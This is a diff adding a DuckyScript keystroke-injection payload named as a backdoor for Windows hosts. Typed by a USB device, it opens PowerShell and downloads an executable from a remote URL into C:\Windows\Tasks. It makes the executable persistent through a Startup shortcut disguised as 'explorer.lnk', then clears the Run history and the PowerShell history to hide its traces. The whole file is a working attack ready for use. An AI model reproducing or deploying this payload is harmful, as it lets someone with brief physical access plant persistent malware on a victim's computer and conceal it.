@@ -1,0 +1,22 @@
+REM Made by papi
+REM Create on Sat 03 Feb 2024 11:27:10 PM CET
+REM
+REM remote_url_backdoor.txt
+REM
+REM Description:
+REM   A script that will download and save a exe from a url onto a windows host
+
+DELAY 500
+GUI r
+STRINGLN powershell
+DELAY 200
+STRINGLN Invoke-WebRequest -UseBasicParsing {DUCKY_REMOTE_URL} -o C:\Windows\Tasks\a.exe
+STRINGLN $exePath = "C:\Windows\Tasks\a.exe"
+STRINGLN $userStartupFolder = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
+STRINGLN $shortcut = (New-Object -ComObject WScript.Shell).CreateShortcut([System.IO.Path]::Combine($userStartupFolder, "explorer.lnk"))
+STRINGLN $shortcut.TargetPath = $exePath
+STRINGLN $shortcut.Save()
+STRINGLN Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*"
+STRINGLN Remove-Item "$env:USERPROFILE\Documents\PowerShell\ConsoleHost_history.txt"
+STRINGLN exit
+
